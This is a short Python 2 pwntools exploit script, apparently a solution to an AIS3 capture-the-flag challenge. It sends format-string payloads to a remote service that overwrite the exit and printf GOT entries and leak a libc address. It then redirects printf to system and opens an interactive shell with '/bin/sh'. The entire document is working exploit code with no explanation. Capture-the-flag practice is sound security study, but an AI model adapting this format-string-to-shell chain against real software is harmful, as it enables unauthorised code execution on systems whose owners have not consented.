#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
r = remote('pre-exam-pwn.ais3.org', 10003)
#r = process('./hello')

# main 0x4006e8
binary = ELF('./hello')
libc = ELF('./libc.so.6')

payload1 = flat(
    '%1768c%10$hn%88c%11$hhn=%17$llx'.ljust(32,'A'),
    binary.got['exit'] + 0,
    binary.got['exit'] + 2
)


r.send(payload1)
r.recvuntil('=')
base = int(r.recvn(12),16) - 0x21b97
libc.address = base

# magic = base + 0x4f2c5
# f1 = magic % 65536
# f2 = magic % (256**3) // 65536
system = libc.symbols['system']
f1 = system % 65536
f2 = system % (256**3) // 65536

payload2 = flat(
    '%{}c%10$hn%{}c%11$hhn'.format(f1, 256-(f1%256)+f2).ljust(32,'A'),
    binary.got['printf'],
    binary.got['printf'] + 2
)
print len(payload2), payload2

r.send(payload2)
r.send('/bin/sh\0')

r.interactive()
